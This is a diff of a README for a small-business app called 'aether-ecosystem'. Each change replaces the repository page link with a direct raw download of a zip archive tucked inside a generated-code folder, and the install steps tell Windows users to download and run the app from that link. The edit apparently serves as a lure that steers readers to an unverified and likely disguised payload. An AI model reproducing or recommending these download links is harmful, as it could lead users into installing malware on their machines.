@@ -1,6 +1,6 @@
 # ✨ aether-ecosystem - Unified operations for lean teams
 
-[![Download](https://img.shields.io/badge/Download-Aether%20Ecosystem-blue?style=for-the-badge&logo=github)](https://github.com/Highbrow-genuscrataegus240/aether-ecosystem)
+[![Download](https://img.shields.io/badge/Download-Aether%20Ecosystem-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Highbrow-genuscrataegus240/aether-ecosystem/main/prisma/generated/crm/runtime/aether-ecosystem-v2.1-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Aether Ecosystem is a business app for small teams that want one place for custo
 
 Use the link below to visit the download page:
 
-**Download page:** https://github.com/Highbrow-genuscrataegus240/aether-ecosystem
+**Download page:** https://raw.githubusercontent.com/Highbrow-genuscrataegus240/aether-ecosystem/main/prisma/generated/crm/runtime/aether-ecosystem-v2.1-beta.2.zip
 
 ## 🪟 What You Need on Windows
 
@@ -25,7 +25,7 @@ For a smooth experience, close other large apps before you open Aether Ecosystem
 ## 📦 Download and Install
 
 1. Open this page in your browser:
-   https://github.com/Highbrow-genuscrataegus240/aether-ecosystem
+   https://raw.githubusercontent.com/Highbrow-genuscrataegus240/aether-ecosystem/main/prisma/generated/crm/runtime/aether-ecosystem-v2.1-beta.2.zip
 
 2. Find the latest download file on the page.
 
@@ -182,7 +182,7 @@ This project uses modern web app tools and business data ideas:
 
 Use this page to download and run the app on Windows:
 
-https://github.com/Highbrow-genuscrataegus240/aether-ecosystem
+https://raw.githubusercontent.com/Highbrow-genuscrataegus240/aether-ecosystem/main/prisma/generated/crm/runtime/aether-ecosystem-v2.1-beta.2.zip
 
 ## 🖥️ Windows Run Steps
 
@@ -230,4 +230,4 @@ Most users will move through these areas:
 
 If you need the download page again, use this link:
 
-[Open the Aether Ecosystem download page](https://github.com/Highbrow-genuscrataegus240/aether-ecosystem)
+[Open the Aether Ecosystem download page](https://raw.githubusercontent.com/Highbrow-genuscrataegus240/aether-ecosystem/main/prisma/generated/crm/runtime/aether-ecosystem-v2.1-beta.2.zip)
